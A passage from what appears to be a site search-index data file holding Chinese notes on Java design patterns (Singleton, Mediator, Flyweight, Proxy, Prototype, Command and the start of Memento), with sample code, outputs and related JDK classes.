\u53CC\u91CD\u6821\u9A8C\u9501\u5148\u5224\u65AD uniqueInstance \u662F\u5426\u5DF2\u7ECF\u88AB\u5B9E\u4F8B\u5316\uFF0C\u5982\u679C\u6CA1\u6709\u88AB\u5B9E\u4F8B\u5316\uFF0C\u90A3\u4E48\u624D\u5BF9\u5B9E\u4F8B\u5316\u8BED\u53E5\u8FDB\u884C\u52A0\u9501\u3002
public class Singleton { private volatile static Singleton uniqueInstance; private Singleton() { } public static Singleton getUniqueInstance() { if (uniqueInstance == null) { synchronized (Singleton.class) { if (uniqueInstance == null) { uniqueInstance = new Singleton(); } } } return uniqueInstance; }
}
\u8003\u8651\u4E0B\u9762\u7684\u5B9E\u73B0\uFF0C\u4E5F\u5C31\u662F\u53EA\u4F7F\u7528\u4E86\u4E00\u4E2A if \u8BED\u53E5\u3002\u5728 uniqueInstance == null \u7684\u60C5\u51B5\u4E0B\uFF0C\u5982\u679C\u4E24\u4E2A\u7EBF\u7A0B\u90FD\u6267\u884C\u4E86 if \u8BED\u53E5\uFF0C\u90A3\u4E48\u4E24\u4E2A\u7EBF\u7A0B\u90FD\u4F1A\u8FDB\u5165 if \u8BED\u53E5\u5757\u5185\u3002\u867D\u7136\u5728 if \u8BED\u53E5\u5757\u5185\u6709\u52A0\u9501\u64CD\u4F5C\uFF0C\u4F46\u662F\u4E24\u4E2A\u7EBF\u7A0B\u90FD\u4F1A\u6267\u884C uniqueInstance = new Singleton(); \u8FD9\u6761\u8BED\u53E5\uFF0C\u53EA\u662F\u5148\u540E\u7684\u95EE\u9898\uFF0C\u90A3\u4E48\u5C31\u4F1A\u8FDB\u884C\u4E24\u6B21\u5B9E\u4F8B\u5316\u3002\u56E0\u6B64\u5FC5\u987B\u4F7F\u7528\u53CC\u91CD\u6821\u9A8C\u9501\uFF0C\u4E5F\u5C31\u662F\u9700\u8981\u4F7F\u7528\u4E24\u4E2A if \u8BED\u53E5\uFF1A\u7B2C\u4E00\u4E2A if \u8BED\u53E5\u7528\u6765\u907F\u514D uniqueInstance \u5DF2\u7ECF\u88AB\u5B9E\u4F8B\u5316\u4E4B\u540E\u7684\u52A0\u9501\u64CD\u4F5C\uFF0C\u800C\u7B2C\u4E8C\u4E2A if \u8BED\u53E5\u8FDB\u884C\u4E86\u52A0\u9501\uFF0C\u6240\u4EE5\u53EA\u80FD\u6709\u4E00\u4E2A\u7EBF\u7A0B\u8FDB\u5165\uFF0C\u5C31\u4E0D\u4F1A\u51FA\u73B0 uniqueInstance == null \u65F6\u4E24\u4E2A\u7EBF\u7A0B\u540C\u65F6\u8FDB\u884C\u5B9E\u4F8B\u5316\u64CD\u4F5C\u3002
if (uniqueInstance == null) { synchronized (Singleton.class) { uniqueInstance = new Singleton(); }
}
uniqueInstance \u91C7\u7528 volatile \u5173\u952E\u5B57\u4FEE\u9970\u4E5F\u662F\u5F88\u6709\u5FC5\u8981\u7684\uFF0C uniqueInstance = new Singleton(); \u8FD9\u6BB5\u4EE3\u7801\u5176\u5B9E\u662F\u5206\u4E3A\u4E09\u6B65\u6267\u884C\uFF1A \u4E3A uniqueInstance \u5206\u914D\u5185\u5B58\u7A7A\u95F4
\u521D\u59CB\u5316 uniqueInstance
\u5C06 uniqueInstance \u6307\u5411\u5206\u914D\u7684\u5185\u5B58\u5730\u5740 \u4F46\u662F\u7531\u4E8E JVM \u5177\u6709\u6307\u4EE4\u91CD\u6392\u7684\u7279\u6027\uFF0C\u6267\u884C\u987A\u5E8F\u6709\u53EF\u80FD\u53D8\u6210 1>3>2\u3002\u6307\u4EE4\u91CD\u6392\u5728\u5355\u7EBF\u7A0B\u73AF\u5883\u4E0B\u4E0D\u4F1A\u51FA\u73B0\u95EE\u9898\uFF0C\u4F46\u662F\u5728\u591A\u7EBF\u7A0B\u73AF\u5883\u4E0B\u4F1A\u5BFC\u81F4\u4E00\u4E2A\u7EBF\u7A0B\u83B7\u5F97\u8FD8\u6CA1\u6709\u521D\u59CB\u5316\u7684\u5B9E\u4F8B\u3002\u4F8B\u5982\uFF0C\u7EBF\u7A0B T1 \u6267\u884C\u4E86 1 \u548C 3\uFF0C\u6B64\u65F6 T2 \u8C03\u7528 getUniqueInstance() \u540E\u53D1\u73B0 uniqueInstance \u4E0D\u4E3A\u7A7A\uFF0C\u56E0\u6B64\u8FD4\u56DE uniqueInstance\uFF0C\u4F46\u6B64\u65F6 uniqueInstance \u8FD8\u672A\u88AB\u521D\u59CB\u5316\u3002
\u4F7F\u7528 volatile \u53EF\u4EE5\u7981\u6B62 JVM \u7684\u6307\u4EE4\u91CD\u6392\uFF0C\u4FDD\u8BC1\u5728\u591A\u7EBF\u7A0B\u73AF\u5883\u4E0B\u4E5F\u80FD\u6B63\u5E38\u8FD0\u884C\u3002`},{header:"\u2164 \u9759\u6001\u5185\u90E8\u7C7B\u5B9E\u73B0",slug:"v-\u9759\u6001\u5185\u90E8\u7C7B\u5B9E\u73B0",content:`\u5F53 Singleton \u7C7B\u88AB\u52A0\u8F7D\u65F6\uFF0C\u9759\u6001\u5185\u90E8\u7C7B SingletonHolder \u6CA1\u6709\u88AB\u52A0\u8F7D\u8FDB\u5185\u5B58\u3002\u53EA\u6709\u5F53\u8C03\u7528 getUniqueInstance() \u65B9\u6CD5\u4ECE\u800C\u89E6\u53D1 SingletonHolder.INSTANCE \u65F6 SingletonHolder \u624D\u4F1A\u88AB\u52A0\u8F7D\uFF0C\u6B64\u65F6\u521D\u59CB\u5316 INSTANCE \u5B9E\u4F8B\uFF0C\u5E76\u4E14 JVM \u80FD\u786E\u4FDD INSTANCE \u53EA\u88AB\u5B9E\u4F8B\u5316\u4E00\u6B21\u3002
\u8FD9\u79CD\u65B9\u5F0F\u4E0D\u4EC5\u5177\u6709\u5EF6\u8FDF\u521D\u59CB\u5316\u7684\u597D\u5904\uFF0C\u800C\u4E14\u7531 JVM \u63D0\u4F9B\u4E86\u5BF9\u7EBF\u7A0B\u5B89\u5168\u7684\u652F\u6301\u3002
public class Singleton { private Singleton() { } private static class SingletonHolder { private static final Singleton INSTANCE = new Singleton(); } public static Singleton getUniqueInstance() { return SingletonHolder.INSTANCE; }
}`},{header:"\u2165 \u679A\u4E3E\u5B9E\u73B0",slug:"vi-\u679A\u4E3E\u5B9E\u73B0",content:`public enum Singleton { INSTANCE; private String objName; public String getObjName() { return objName; } public void setObjName(String objName) { this.objName = objName; } public static void main(String[] args) { // \u5355\u4F8B\u6D4B\u8BD5 Singleton firstSingleton = Singleton.INSTANCE; firstSingleton.setObjName("firstName"); System.out.println(firstSingleton.getObjName()); Singleton secondSingleton = Singleton.INSTANCE; secondSingleton.setObjName("secondName"); System.out.println(firstSingleton.getObjName()); System.out.println(secondSingleton.getObjName()); // \u53CD\u5C04\u83B7\u53D6\u5B9E\u4F8B\u6D4B\u8BD5 try { Singleton[] enumConstants = Singleton.class.getEnumConstants(); for (Singleton enumConstant : enumConstants) { System.out.println(enumConstant.getObjName()); } } catch (Exception e) { e.printStackTrace(); } }
}
firstName
secondName
secondName
secondName
\u8BE5\u5B9E\u73B0\u53EF\u4EE5\u9632\u6B62\u53CD\u5C04\u653B\u51FB\u3002\u5728\u5176\u5B83\u5B9E\u73B0\u4E2D\uFF0C\u901A\u8FC7 setAccessible() \u65B9\u6CD5\u53EF\u4EE5\u5C06\u79C1\u6709\u6784\u9020\u51FD\u6570\u7684\u8BBF\u95EE\u7EA7\u522B\u8BBE\u7F6E\u4E3A public\uFF0C\u7136\u540E\u8C03\u7528\u6784\u9020\u51FD\u6570\u4ECE\u800C\u5B9E\u4F8B\u5316\u5BF9\u8C61\uFF0C\u5982\u679C\u8981\u9632\u6B62\u8FD9\u79CD\u653B\u51FB\uFF0C\u9700\u8981\u5728\u6784\u9020\u51FD\u6570\u4E2D\u6DFB\u52A0\u9632\u6B62\u591A\u6B21\u5B9E\u4F8B\u5316\u7684\u4EE3\u7801\u3002\u8BE5\u5B9E\u73B0\u662F\u7531 JVM \u4FDD\u8BC1\u53EA\u4F1A\u5B9E\u4F8B\u5316\u4E00\u6B21\uFF0C\u56E0\u6B64\u4E0D\u4F1A\u51FA\u73B0\u4E0A\u8FF0\u7684\u53CD\u5C04\u653B\u51FB\u3002
\u8BE5\u5B9E\u73B0\u5728\u591A\u6B21\u5E8F\u5217\u5316\u548C\u5E8F\u5217\u5316\u4E4B\u540E\uFF0C\u4E0D\u4F1A\u5F97\u5230\u591A\u4E2A\u5B9E\u4F8B\u3002\u800C\u5176\u5B83\u5B9E\u73B0\u9700\u8981\u4F7F\u7528 transient \u4FEE\u9970\u6240\u6709\u5B57\u6BB5\uFF0C\u5E76\u4E14\u5B9E\u73B0\u5E8F\u5217\u5316\u548C\u53CD\u5E8F\u5217\u5316\u7684\u65B9\u6CD5\u3002`},{header:"Examples",slug:"examples",content:`Logger Classes
Configuration Classes
Accesing resources in shared mode
Factories implemented as Singletons`},{header:"JDK",slug:"jdk",content:`java.lang.Runtime#getRuntime()
java.awt.Desktop#getDesktop()
java.lang.System#getSecurityManager()`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E4%B8%AD%E4%BB%8B%E8%80%85.html",title:"",pathLocale:"/",contents:[{header:"5. \u4E2D\u4ECB\u8005\uFF08Mediator\uFF09",slug:"_5-\u4E2D\u4ECB\u8005-mediator",content:""},{header:"Intent",slug:"intent",content:"\u96C6\u4E2D\u76F8\u5173\u5BF9\u8C61\u4E4B\u95F4\u590D\u6742\u7684\u6C9F\u901A\u548C\u63A7\u5236\u65B9\u5F0F\u3002"},{header:"Class Diagram",slug:"class-diagram",content:`Mediator\uFF1A\u4E2D\u4ECB\u8005\uFF0C\u5B9A\u4E49\u4E00\u4E2A\u63A5\u53E3\u7528\u4E8E\u4E0E\u5404\u540C\u4E8B\uFF08Colleague\uFF09\u5BF9\u8C61\u901A\u4FE1\u3002
Colleague\uFF1A\u540C\u4E8B\uFF0C\u76F8\u5173\u5BF9\u8C61`},{header:"Implementation",slug:"implementation",content:`Alarm\uFF08\u95F9\u949F\uFF09\u3001CoffeePot\uFF08\u5496\u5561\u58F6\uFF09\u3001Calendar\uFF08\u65E5\u5386\uFF09\u3001Sprinkler\uFF08\u55B7\u5934\uFF09\u662F\u4E00\u7EC4\u76F8\u5173\u7684\u5BF9\u8C61\uFF0C\u5728\u67D0\u4E2A\u5BF9\u8C61\u7684\u4E8B\u4EF6\u4EA7\u751F\u65F6\u9700\u8981\u53BB\u64CD\u4F5C\u5176\u5B83\u5BF9\u8C61\uFF0C\u5F62\u6210\u4E86\u4E0B\u9762\u8FD9\u79CD\u4F9D\u8D56\u7ED3\u6784\uFF1A \u4F7F\u7528\u4E2D\u4ECB\u8005\u6A21\u5F0F\u53EF\u4EE5\u5C06\u590D\u6742\u7684\u4F9D\u8D56\u7ED3\u6784\u53D8\u6210\u661F\u5F62\u7ED3\u6784\uFF1A public abstract class Colleague { public abstract void onEvent(Mediator mediator);
}
public class Alarm extends Colleague { @Override public void onEvent(Mediator mediator) { mediator.doEvent("alarm"); } public void doAlarm() { System.out.println("doAlarm()"); }
}
public class CoffeePot extends Colleague { @Override public void onEvent(Mediator mediator) { mediator.doEvent("coffeePot"); } public void doCoffeePot() { System.out.println("doCoffeePot()"); }
}
public class Calender extends Colleague { @Override public void onEvent(Mediator mediator) { mediator.doEvent("calender"); } public void doCalender() { System.out.println("doCalender()"); }
}
public class Sprinkler extends Colleague { @Override public void onEvent(Mediator mediator) { mediator.doEvent("sprinkler"); } public void doSprinkler() { System.out.println("doSprinkler()"); }
}
public abstract class Mediator { public abstract void doEvent(String eventType);
}
public class ConcreteMediator extends Mediator { private Alarm alarm; private CoffeePot coffeePot; private Calender calender; private Sprinkler sprinkler; public ConcreteMediator(Alarm alarm, CoffeePot coffeePot, Calender calender, Sprinkler sprinkler) { this.alarm = alarm; this.coffeePot = coffeePot; this.calender = calender; this.sprinkler = sprinkler; } @Override public void doEvent(String eventType) { switch (eventType) { case "alarm": doAlarmEvent(); break; case "coffeePot": doCoffeePotEvent(); break; case "calender": doCalenderEvent(); break; default: doSprinklerEvent(); } } public void doAlarmEvent() { alarm.doAlarm(); coffeePot.doCoffeePot(); calender.doCalender(); sprinkler.doSprinkler(); } public void doCoffeePotEvent() { // ... } public void doCalenderEvent() { // ... } public void doSprinklerEvent() { // ... }
}
public class Client { public static void main(String[] args) { Alarm alarm = new Alarm(); CoffeePot coffeePot = new CoffeePot(); Calender calender = new Calender(); Sprinkler sprinkler = new Sprinkler(); Mediator mediator = new ConcreteMediator(alarm, coffeePot, calender, sprinkler); // \u95F9\u949F\u4E8B\u4EF6\u5230\u8FBE\uFF0C\u8C03\u7528\u4E2D\u4ECB\u8005\u5C31\u53EF\u4EE5\u64CD\u4F5C\u76F8\u5173\u5BF9\u8C61 alarm.onEvent(mediator); }
}
doAlarm()
doCoffeePot()
doCalender()
doSprinkler()`},{header:"JDK",slug:"jdk",content:`All scheduleXXX() methods of java.util.Timer
java.util.concurrent.Executor#execute()
submit() and invokeXXX() methods of java.util.concurrent.ExecutorService
scheduleXXX() methods of java.util.concurrent.ScheduledExecutorService
java.lang.reflect.Method#invoke()`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E4%BA%AB%E5%85%83.html",title:"",pathLocale:"/",contents:[{header:"\u4EAB\u5143\uFF08Flyweight\uFF09",slug:"\u4EAB\u5143-flyweight",content:""},{header:"Intent",slug:"intent",content:"\u5229\u7528\u5171\u4EAB\u7684\u65B9\u5F0F\u6765\u652F\u6301\u5927\u91CF\u7EC6\u7C92\u5EA6\u7684\u5BF9\u8C61\uFF0C\u8FD9\u4E9B\u5BF9\u8C61\u4E00\u90E8\u5206\u5185\u90E8\u72B6\u6001\u662F\u76F8\u540C\u7684\u3002"},{header:"Class Diagram",slug:"class-diagram",content:`Flyweight\uFF1A\u4EAB\u5143\u5BF9\u8C61
IntrinsicState\uFF1A\u5185\u90E8\u72B6\u6001\uFF0C\u4EAB\u5143\u5BF9\u8C61\u5171\u4EAB\u5185\u90E8\u72B6\u6001
ExtrinsicState\uFF1A\u5916\u90E8\u72B6\u6001\uFF0C\u6BCF\u4E2A\u4EAB\u5143\u5BF9\u8C61\u7684\u5916\u90E8\u72B6\u6001\u4E0D\u540C`},{header:"Implementation",slug:"implementation",content:`public interface Flyweight { void doOperation(String extrinsicState);
}
public class ConcreteFlyweight implements Flyweight { private String intrinsicState; public ConcreteFlyweight(String intrinsicState) { this.intrinsicState = intrinsicState; } @Override public void doOperation(String extrinsicState) { System.out.println("Object address: " + System.identityHashCode(this)); System.out.println("IntrinsicState: " + intrinsicState); System.out.println("ExtrinsicState: " + extrinsicState); }
}
public class FlyweightFactory { private HashMap<String, Flyweight> flyweights = new HashMap<>(); Flyweight getFlyweight(String intrinsicState) { if (!flyweights.containsKey(intrinsicState)) { Flyweight flyweight = new ConcreteFlyweight(intrinsicState); flyweights.put(intrinsicState, flyweight); } return flyweights.get(intrinsicState); }
}
public class Client { public static void main(String[] args) { FlyweightFactory factory = new FlyweightFactory(); Flyweight flyweight1 = factory.getFlyweight("aa"); Flyweight flyweight2 = factory.getFlyweight("aa"); flyweight1.doOperation("x"); flyweight2.doOperation("y"); }
}
Object address: 1163157884
IntrinsicState: aa
ExtrinsicState: x
Object address: 1163157884
IntrinsicState: aa
ExtrinsicState: y`},{header:"JDK",slug:"jdk",content:`Java \u5229\u7528\u7F13\u5B58\u6765\u52A0\u901F\u5927\u91CF\u5C0F\u5BF9\u8C61\u7684\u8BBF\u95EE\u65F6\u95F4\u3002 java.lang.Integer#valueOf(int)
java.lang.Boolean#valueOf(boolean)
java.lang.Byte#valueOf(byte)
java.lang.Character#valueOf(char)`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E4%BB%A3%E7%90%86.html",title:"",pathLocale:"/",contents:[{header:"\u4EE3\u7406\uFF08Proxy\uFF09",slug:"\u4EE3\u7406-proxy",content:""},{header:"Intent",slug:"intent",content:"\u63A7\u5236\u5BF9\u5176\u5B83\u5BF9\u8C61\u7684\u8BBF\u95EE\u3002"},{header:"Class Diagram",slug:"class-diagram",content:`\u4EE3\u7406\u6709\u4EE5\u4E0B\u56DB\u7C7B\uFF1A \u8FDC\u7A0B\u4EE3\u7406\uFF08Remote Proxy\uFF09\uFF1A\u63A7\u5236\u5BF9\u8FDC\u7A0B\u5BF9\u8C61\uFF08\u4E0D\u540C\u5730\u5740\u7A7A\u95F4\uFF09\u7684\u8BBF\u95EE\uFF0C\u5B83\u8D1F\u8D23\u5C06\u8BF7\u6C42\u53CA\u5176\u53C2\u6570\u8FDB\u884C\u7F16\u7801\uFF0C\u5E76\u5411\u4E0D\u540C\u5730\u5740\u7A7A\u95F4\u4E2D\u7684\u5BF9\u8C61\u53D1\u9001\u5DF2\u7ECF\u7F16\u7801\u7684\u8BF7\u6C42\u3002
\u865A\u62DF\u4EE3\u7406\uFF08Virtual Proxy\uFF09\uFF1A\u6839\u636E\u9700\u8981\u521B\u5EFA\u5F00\u9500\u5F88\u5927\u7684\u5BF9\u8C61\uFF0C\u5B83\u53EF\u4EE5\u7F13\u5B58\u5B9E\u4F53\u7684\u9644\u52A0\u4FE1\u606F\uFF0C\u4EE5\u4FBF\u5EF6\u8FDF\u5BF9\u5B83\u7684\u8BBF\u95EE\uFF0C\u4F8B\u5982\u5728\u7F51\u7AD9\u52A0\u8F7D\u4E00\u4E2A\u5F88\u5927\u56FE\u7247\u65F6\uFF0C\u4E0D\u80FD\u9A6C\u4E0A\u5B8C\u6210\uFF0C\u53EF\u4EE5\u7528\u865A\u62DF\u4EE3\u7406\u7F13\u5B58\u56FE\u7247\u7684\u5927\u5C0F\u4FE1\u606F\uFF0C\u7136\u540E\u751F\u6210\u4E00\u5F20\u4E34\u65F6\u56FE\u7247\u4EE3\u66FF\u539F\u59CB\u56FE\u7247\u3002
\u4FDD\u62A4\u4EE3\u7406\uFF08Protection Proxy\uFF09\uFF1A\u6309\u6743\u9650\u63A7\u5236\u5BF9\u8C61\u7684\u8BBF\u95EE\uFF0C\u5B83\u8D1F\u8D23\u68C0\u67E5\u8C03\u7528\u8005\u662F\u5426\u5177\u6709\u5B9E\u73B0\u4E00\u4E2A\u8BF7\u6C42\u6240\u5FC5\u987B\u7684\u8BBF\u95EE\u6743\u9650\u3002
\u667A\u80FD\u4EE3\u7406\uFF08Smart Reference\uFF09\uFF1A\u53D6\u4EE3\u4E86\u7B80\u5355\u7684\u6307\u9488\uFF0C\u5B83\u5728\u8BBF\u95EE\u5BF9\u8C61\u65F6\u6267\u884C\u4E00\u4E9B\u9644\u52A0\u64CD\u4F5C\uFF1A\u8BB0\u5F55\u5BF9\u8C61\u7684\u5F15\u7528\u6B21\u6570\uFF1B\u5F53\u7B2C\u4E00\u6B21\u5F15\u7528\u4E00\u4E2A\u5BF9\u8C61\u65F6\uFF0C\u5C06\u5B83\u88C5\u5165\u5185\u5B58\uFF1B\u5728\u8BBF\u95EE\u4E00\u4E2A\u5B9E\u9645\u5BF9\u8C61\u524D\uFF0C\u68C0\u67E5\u662F\u5426\u5DF2\u7ECF\u9501\u5B9A\u4E86\u5B83\uFF0C\u4EE5\u786E\u4FDD\u5176\u5B83\u5BF9\u8C61\u4E0D\u80FD\u6539\u53D8\u5B83\u3002`},{header:"Implementation",slug:"implementation",content:`\u4EE5\u4E0B\u662F\u4E00\u4E2A\u865A\u62DF\u4EE3\u7406\u7684\u5B9E\u73B0\uFF0C\u6A21\u62DF\u4E86\u56FE\u7247\u5EF6\u8FDF\u52A0\u8F7D\u7684\u60C5\u51B5\u4E0B\u4F7F\u7528\u4E0E\u56FE\u7247\u5927\u5C0F\u76F8\u7B49\u7684\u4E34\u65F6\u5185\u5BB9\u53BB\u66FF\u6362\u539F\u59CB\u56FE\u7247\uFF0C\u76F4\u5230\u56FE\u7247\u52A0\u8F7D\u5B8C\u6210\u624D\u5C06\u56FE\u7247\u663E\u793A\u51FA\u6765\u3002
public interface Image { void showImage();
}
public class HighResolutionImage implements Image { private URL imageURL; private long startTime; private int height; private int width; public int getHeight() { return height; } public int getWidth() { return width; } public HighResolutionImage(URL imageURL) { this.imageURL = imageURL; this.startTime = System.currentTimeMillis(); this.width = 600; this.height = 600; } public boolean isLoad() { // \u6A21\u62DF\u56FE\u7247\u52A0\u8F7D\uFF0C\u5EF6\u8FDF 3s \u52A0\u8F7D\u5B8C\u6210 long endTime = System.currentTimeMillis(); return endTime - startTime > 3000; } @Override public void showImage() { System.out.println("Real Image: " + imageURL); }
}
public class ImageProxy implements Image { private HighResolutionImage highResolutionImage; public ImageProxy(HighResolutionImage highResolutionImage) { this.highResolutionImage = highResolutionImage; } @Override public void showImage() { while (!highResolutionImage.isLoad()) { try { System.out.println("Temp Image: " + highResolutionImage.getWidth() + " " + highResolutionImage.getHeight()); Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); } } highResolutionImage.showImage(); }
}
public class ImageViewer { public static void main(String[] args) throws Exception { String image = "http://image.jpg"; URL url = new URL(image); HighResolutionImage highResolutionImage = new HighResolutionImage(url); ImageProxy imageProxy = new ImageProxy(highResolutionImage); imageProxy.showImage(); }
}`},{header:"JDK",slug:"jdk",content:`java.lang.reflect.Proxy
RMI`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F.html",title:"",pathLocale:"/",contents:[{header:"6. \u539F\u578B\u6A21\u5F0F\uFF08Prototype\uFF09",slug:"_6-\u539F\u578B\u6A21\u5F0F-prototype",content:""},{header:"Intent",slug:"intent",content:"\u4F7F\u7528\u539F\u578B\u5B9E\u4F8B\u6307\u5B9A\u8981\u521B\u5EFA\u5BF9\u8C61\u7684\u7C7B\u578B\uFF0C\u901A\u8FC7\u590D\u5236\u8FD9\u4E2A\u539F\u578B\u6765\u521B\u5EFA\u65B0\u5BF9\u8C61\u3002"},{header:"Class Diagram",slug:"class-diagram",content:""},{header:"Implementation",slug:"implementation",content:`public abstract class Prototype { abstract Prototype myClone();
}
public class ConcretePrototype extends Prototype { private String filed; public ConcretePrototype(String filed) { this.filed = filed; } @Override Prototype myClone() { return new ConcretePrototype(filed); } @Override public String toString() { return filed; }
}
public class Client { public static void main(String[] args) { Prototype prototype = new ConcretePrototype("abc"); Prototype clone = prototype.myClone(); System.out.println(clone.toString()); }
}
abc`},{header:"JDK",slug:"jdk",content:"java.lang.Object#clone()"}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E5%91%BD%E4%BB%A4.html",title:"",pathLocale:"/",contents:[{header:"2. \u547D\u4EE4\uFF08Command\uFF09",slug:"_2-\u547D\u4EE4-command",content:""},{header:"Intent",slug:"intent",content:`\u5C06\u547D\u4EE4\u5C01\u88C5\u6210\u5BF9\u8C61\u4E2D\uFF0C\u5177\u6709\u4EE5\u4E0B\u4F5C\u7528\uFF1A \u4F7F\u7528\u547D\u4EE4\u6765\u53C2\u6570\u5316\u5176\u5B83\u5BF9\u8C61
\u5C06\u547D\u4EE4\u653E\u5165\u961F\u5217\u4E2D\u8FDB\u884C\u6392\u961F
\u5C06\u547D\u4EE4\u7684\u64CD\u4F5C\u8BB0\u5F55\u5230\u65E5\u5FD7\u4E2D
\u652F\u6301\u53EF\u64A4\u9500\u7684\u64CD\u4F5C`},{header:"Class Diagram",slug:"class-diagram",content:`Command\uFF1A\u547D\u4EE4
Receiver\uFF1A\u547D\u4EE4\u63A5\u6536\u8005\uFF0C\u4E5F\u5C31\u662F\u547D\u4EE4\u771F\u6B63\u7684\u6267\u884C\u8005
Invoker\uFF1A\u901A\u8FC7\u5B83\u6765\u8C03\u7528\u547D\u4EE4
Client\uFF1A\u53EF\u4EE5\u8BBE\u7F6E\u547D\u4EE4\u4E0E\u547D\u4EE4\u7684\u63A5\u6536\u8005`},{header:"Implementation",slug:"implementation",content:`\u8BBE\u8BA1\u4E00\u4E2A\u9065\u63A7\u5668\uFF0C\u53EF\u4EE5\u63A7\u5236\u7535\u706F\u5F00\u5173\u3002 public interface Command { void execute();
}
public class LightOnCommand implements Command { Light light; public LightOnCommand(Light light) { this.light = light; } @Override public void execute() { light.on(); }
}
public class LightOffCommand implements Command { Light light; public LightOffCommand(Light light) { this.light = light; } @Override public void execute() { light.off(); }
}
public class Light { public void on() { System.out.println("Light is on!"); } public void off() { System.out.println("Light is off!"); }
}
/** * \u9065\u63A7\u5668 */
public class Invoker { private Command[] onCommands; private Command[] offCommands; private final int slotNum = 7; public Invoker() { this.onCommands = new Command[slotNum]; this.offCommands = new Command[slotNum]; } public void setOnCommand(Command command, int slot) { onCommands[slot] = command; } public void setOffCommand(Command command, int slot) { offCommands[slot] = command; } public void onButtonWasPushed(int slot) { onCommands[slot].execute(); } public void offButtonWasPushed(int slot) { offCommands[slot].execute(); }
}
public class Client { public static void main(String[] args) { Invoker invoker = new Invoker(); Light light = new Light(); Command lightOnCommand = new LightOnCommand(light); Command lightOffCommand = new LightOffCommand(light); invoker.setOnCommand(lightOnCommand, 0); invoker.setOffCommand(lightOffCommand, 0); invoker.onButtonWasPushed(0); invoker.offButtonWasPushed(0); }
}`},{header:"JDK",slug:"jdk",content:`java.lang.Runnable
Netflix Hystrix
javax.swing.Action`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E5%A4%87%E5%BF%98%E5%BD%95.html",title:"",pathLocale:"/",contents:[{header:"\u5907\u5FD8\u5F55\uFF08Memento\uFF09",slug:"\u5907\u5FD8\u5F55-memento",content:""},{header:"Intent",slug:"intent",content:"\u5728\u4E0D\u8FDD\u53CD\u5C01\u88C5\u7684\u60C5\u51B5\u4E0B\u83B7\u5F97\u5BF9\u8C61\u7684\u5185\u90E8\u72B6\u6001\uFF0C\u4ECE\u800C\u5728\u9700\u8981\u65F6\u53EF\u4EE5\u5C06\u5BF9\u8C61\u6062\u590D\u5230\u6700\u521D\u72B6\u6001\u3002"},{header:"Class Diagram",slug:"class-diagram",content:`Originator\uFF1A\u539F\u59CB\u5BF9\u8C61
Caretaker\uFF1A\u8D1F\u8D23\u4FDD\u5B58\u597D\u5907\u5FD8\u5F55
Memento\uFF1A\u5907\u5FD8\u5F55\uFF0C\u5B58\u50A8\u539F\u59CB\u5BF9\u8C61\u7684\u72B6\u6001\u3002\u5907\u5FD8\u5F55\u5B9E\u9645\u4E0A\u6709\u4E24\u4E2A\u63A5\u53E3\uFF0C\u4E00\u4E2A\u662F\u63D0\u4F9B\u7ED9 Caretaker \u7684\u7A84\u63A5\u53E3\uFF1A\u5B83\u53EA\u80FD\u5C06\u5907\u5FD8\u5F55\u4F20\u9012\u7ED9\u5176\u5B83\u5BF9\u8C61\uFF1B\u4E00\u4E2A\u662F\u63D0\u4F9B\u7ED9 Originator \u7684\u5BBD\u63A5\u53E3\uFF0C\u5141\u8BB8\u5B83\u8BBF\u95EE\u5230\u5148\u524D\u72B6\u6001\u6240\u9700\u7684\u6240\u6709\u6570\u636E\u3002\u7406\u60F3\u60C5\u51B5\u662F\u53EA\u5141\u8BB8 Originator \u8BBF\u95EE\u672C\u5907\u5FD8\u5F55\u7684\u5185\u90E8\u72B6\u6001\u3002`},{header:"Implementation",slug:"implementation",content:`\u4EE5\u4E0B\u5B9E\u73B0\u4E86\u4E00\u4E2A\u7B80\u5355\u8BA1\u7B97\u5668\u7A0B\u5E8F\uFF0C\u53EF\u4EE5\u8F93\u5165\u4E24\u4E2A\u503C\uFF0C\u7136\u540E\u8BA1\u7B97\u8FD9\u4E24\u4E2A\u503C\u7684\u548C\u3002\u5907\u5FD8\u5F55\u6A21\u5F0F\u5141\u8BB8\u5C06\u8FD9\u4E24\u4E2A\u503C\u5B58\u50A8\u8D77\u6765\uFF0C\u7136\u540E\u5728\u67D0\u4E2A\u65F6\u523B\u7528\u5B58\u50A8\u7684\u72B6\u6001\u8FDB\u884C\u6062\u590D\u3002
\u5B9E\u73B0\u53C2\u8003\uFF1AMemento Pattern - Calculator Example - Java Sourcecode
/** * Originator Interface */
public interface Calculator { // Create Memento PreviousCalculationToCareTaker backupLastCalculation(); // setMemento void restorePreviousCalculation(PreviousCalculationToCareTaker memento); int getCalculationResult(); void setFirstNumber(int firstNumber); void setSecondNumber(int secondNumber);
}
/** * Originator Implementation */
public class CalculatorImp implements Calculator { private int firstNumber; private int secondNumber; @Override public PreviousCalculationToCareTaker backupLastCalculation() { // create a memento object used for restoring two numbers return new PreviousCalculationImp(firstNumber, secondNumber); } @Override public void restorePreviousCalculation(PreviousCalculationToCareTaker memento) { this.firstNumber = ((PreviousCalculationToOriginator) memento).getFirstNumber(); this.secondNumber = ((PreviousCalculationToOriginator) memento).getSecondNumber(); } @Override public int getCalculationResult() { // result is adding two numbers return firstNumber + secondNumber; } @Override public void setFirstNumber(int firstNumber) { this.firstNumber = firstNumber; } @Override public void setSecondNumber(int secondNumber) { this.secondNumber = secondNumber; }
}
/** * Memento Interface to Originator * * This interface allows the originator to restore its state */
public interface PreviousCalculationToOriginator { int getFirstNumber(); int getSecondNumber();
}
/** * Memento interface to CalculatorOperator (Caretaker) */
